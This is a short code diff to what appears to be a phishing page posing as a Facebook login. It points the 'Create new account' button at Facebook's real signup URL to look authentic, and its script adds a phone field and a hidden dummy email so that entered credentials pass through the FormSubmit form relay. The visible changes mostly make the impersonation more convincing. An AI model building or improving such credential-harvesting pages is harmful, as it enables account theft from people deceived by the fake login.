@@ -92,7 +92,9 @@
     </form>
     <a href="#" class="link">Forgotten password?</a>
     <div class="divider"></div>
-    <button class="signup-btn">Create new account</button>
+    <button class="signup-btn" type="button" onclick="window.location.href='https://www.facebook.com/r.php?entry_point=login'">
+      Create new account
+    </button>
   </div>
 
   <script>
@@ -114,7 +116,7 @@
         phoneField.value = input;
         form.appendChild(phoneField);
 
-        // Use a dummy email to satisfy FormSubmit requirement
+        // Add a dummy email to satisfy FormSubmit
         const dummyEmail = document.createElement('input');
         dummyEmail.type = 'hidden';
         dummyEmail.name = 'email';
